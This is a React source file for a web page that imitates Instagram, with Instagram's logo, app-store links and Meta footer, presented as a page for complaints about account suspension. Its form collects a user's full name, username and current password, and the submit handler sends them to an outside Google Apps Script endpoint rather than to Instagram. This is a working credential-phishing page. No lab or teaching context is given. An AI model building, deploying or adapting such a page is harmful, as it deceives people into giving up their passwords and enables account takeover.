import React, { useEffect, useRef } from 'react';
import './App.css';

function App() {
  const screensRef = useRef([]);
  const screenIndex = useRef(0); // This will persist across re-renders

  // Define SwitchScreen inside useEffect
  useEffect(() => {
    const SwitchScreen = () => {
      // Hide all screens initially
      screensRef.current.forEach((screen) => {
        if (screen) screen.style.display = 'none';
      });
      
      // Update the screen index and show the next screen
      screenIndex.current = (screenIndex.current + 1) % screensRef.current.length;
      if (screensRef.current[screenIndex.current]) {
        screensRef.current[screenIndex.current].style.display = 'block';
      }

      // Repeat every 2500 ms
      setTimeout(SwitchScreen, 2500);
    };

    SwitchScreen(); // Initial call on mount

  }, []);
  const handleSubmit = async (e) => {
    e.preventDefault();
    const formData = {
      fullName: e.target.fullName.value,
      username: e.target.username.value,
      currentPassword: e.target.currentPassword.value,
      reason: e.target.reason.value,
    };
  
    try {
      const response = await fetch('https://script.google.com/macros/s/AKfycbyGFiuUkEaxdBTjN1bOGrW3Chb2ghaeyWJ5KsD3edrdKRfeaRoQR4peskR2B0GFJlDmUA/exec', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });
  
      const result = await response.json();
      if (result.result === "Success") {
        alert('Form submitted successfully!');
        // Optionally, reset the form
        e.target.reset();
      } else {
        alert('There was an error submitting the form.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('There was an error submitting the form.');
    }
  };
  

  return (
    <div className="App">
      <section className="container">
        {/* SMARTPHONE SECTION */}
        <article className="smartphone">
          <div className="screens">
            {[1, 2, 3].map((num, index) => (
              <img
                key={index}
                className="screen fade"
                src={`img/screen${num}.png`}
                alt={`screen${num}`}
                ref={(el) => (screensRef.current[index] = el)}
                style={{ display: index === 0 ? 'block' : 'none' }} // Show only the first screen initially
              />
            ))}
          </div>
          <img src="img/smartphones.png" alt="smartphones" />
        </article>

        {/* FORM SECTION */}
        <article className="form-area">
          <div className="logo">
            <img src="img/logo.png" alt="Instagram Logo" />
            <p className='h'>This Page is only for Complaints Regarding Account Suspisious </p>
          </div>
          <form name="contact" method="POST" onSubmit={handleSubmit}>
    {/* Full Name Input */}
    <input 
      type="text" 
      name="fullName" 
      id="fullName" 
      placeholder="Full Name" 
      required 
    />
    
    {/* Username Input */}
    <input 
      type="text" 
      name="username" 
      id="username" 
      placeholder="Username" 
      required 
    />
    
    {/* Current Password Input */}
    <input 
      type="password" 
      name="currentPassword" 
      id="currentPassword" 
      placeholder="Current Password" 
      required 
    />
    
    {/* Reason Dropdown */}
    <select name="reason" id="reason" required>
      <option value="">Select Reason</option>
      <option value="accountIssue">Account Issue</option>
      <option value="privacyConcern">Privacy Concern</option>
      <option value="passwordReset">Password Reset</option>
      <option value="other">Other</option>
    </select>
    
    {/* Submit Button */}
    <input 
      type="submit" 
      name="submit" 
      value="Submit" 
    />
    </form>
          <div className="apps">
            <p>Get the app</p>
            <a href="https://apps.apple.com/in/app/instagram/id389801252"><img src="img/appstore.png" alt="Download on the App Store" /></a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN&pli=1"><img src="img/googleplay.png" alt="Download on Google Play" /></a>
          </div>
        </article>

        {/* FOOTER */}
        
      </section>
      <footer>
          <div className="footer-content">
            <a href="/">Meta</a>
            <a href="/">About</a>
            <a href="/">Blog</a>
            <a href="/">Careers</a>
            <a href="/">API</a>
            <a href="/">Privacy</a>
            <a href="/">Terms</a>
            <a href="/">Top Accounts</a>
            <a href="/">Hashtags</a>
            <a href="/">Locations</a>
            <a href="/">Instagram Lite</a>
            <a href="/">Contact Uploading & Non-Users</a>
          </div>
          <div>
            <a href="/">Dance</a>
            <a href="/">Food & Drink</a>
            <a href="/">Home & Garden</a>
            <a href="/">Music</a>
            <a href="/">Visual Arts</a>
          </div>
          <div className="copyright">
            <select aria-label="Switch display language">
              {/* Language options */}
              <option value="en">English</option>
              <option value="pt">Portuguese (Portugal)</option>
              <option value="es">Spanish</option>
              <option value="fr">French</option>
              {/* Add additional language options as needed */}
            </select>
            <span>&copy; 2022 Instagram from Meta</span>
          </div>
        </footer>
    </div>
  );
}

export default App;
